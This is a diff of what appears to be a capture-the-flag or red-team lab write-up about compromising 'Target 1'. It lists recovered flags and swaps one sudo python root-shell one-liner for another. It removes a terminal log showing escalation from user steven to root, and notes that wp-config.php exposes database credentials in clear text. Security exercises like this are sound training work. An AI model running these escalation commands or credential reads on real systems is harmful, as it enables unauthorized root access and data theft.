@@ -126,16 +126,11 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
   - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
     - **Exploit Used**
       - Misconfiguration of steven user to run python with root permissions
-       - sudo python -c 'import os; os.system("/bin/sh")'
+       - sudo python -c 'import pty;pty.spawn("/bin/bash")'
          - Once the permissions were escalated, wp-config.php file was readable, file includes the SQL database login information in clear text.
          - With the login information for the database, it could be queried for flags 3 and 4
 
   - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - Same method as flag 3, in the same database
-        $ whoami
-        steven
-        $ sudo python -c 'import os; os.system("/bin/sh")'
-        # whoami
-        root
-        #   
+        <img width="440" alt="9a862e73da430dcb2745b9eade93a2fc" src="https://user-images.githubusercontent.com/84750781/129416877-b61cd1a7-dd9f-4f14-b3bb-21bc034d520f.png">
